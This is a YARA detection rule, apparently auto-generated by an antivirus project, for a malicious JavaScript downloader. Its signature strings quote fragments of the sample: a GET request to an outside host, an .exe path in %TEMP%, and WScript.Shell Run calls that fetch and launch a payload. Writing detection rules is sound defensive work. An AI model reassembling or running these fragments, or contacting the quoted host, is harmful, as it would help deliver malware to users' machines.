rule sig_20160328_cc932101ebdb5b3b81944b37e8166bda {
  meta:
    description = "datamaliciousorder - file 20160328_cc932101ebdb5b3b81944b37e8166bda.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "43ae8780cebb0b1f5e08f894018574fa52e045890c0d034e5ceebab17c2ba552"

  strings:
    $s1  = "function Mmaeat() {return Wsgshqcz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"AC78lkD7yJHPNaf.exe\";};" fullword ascii
    $s2  = "Cvfsvl[Ppcclj](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Nyunitsjyj](Pyilhffylw() * 11)} while (Cvfsvl[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Efxswjch(Vpdkg, Vbaiy){return Vpdkg - Vbaiy;};" fullword ascii
    $s5  = "var Wsgshqcz = function Roghtll() {return WScript[Ermunqi](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Wmgaxdlqln() {return ((Lbjdu == true) && (Lbjdu == Kuxylwnh)) ? 1 : Usmdiuboa;};" fullword ascii
    $s7  = "function Axtmfjifb(Ddongumm){Wsgshqcz[\"Run\"](Ddongumm, Usmdiuboa, Usmdiuboa);};" fullword ascii
    $s8  = "function Gjsrehakgw(Omrgyh) {var Jwuqrzawtr = (1, 2, 3, 4, 5, Omrgyh); return Jwuqrzawtr;};" fullword ascii
    $s9  = " while (Dffwr){" fullword ascii
    $s10 = "var Kuxylwnh = false;" fullword ascii
    $s11 = "function Xpflljfrs(){return Dmrxqi;};" fullword ascii
    $s12 = "return Efxswjch(Abgfgjcnz, Btubsw);" fullword ascii
    $s13 = "function Cgcozurtc(){return Ermunqi;};" fullword ascii
    $s14 = "Kuxylwnh = true; " fullword ascii
    $s15 = "var Slkoqiiow = new this[\"Date\"]();" fullword ascii
    $s16 = "function Pyilhffylw(){return 22;};" fullword ascii
    $s17 = "Lbjdu = true; " fullword ascii
    $s18 = "var Lbjdu = false;" fullword ascii
    $s19 = "function Ypigykgr()" fullword ascii
    $s20 = "var Cufahsrhca = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}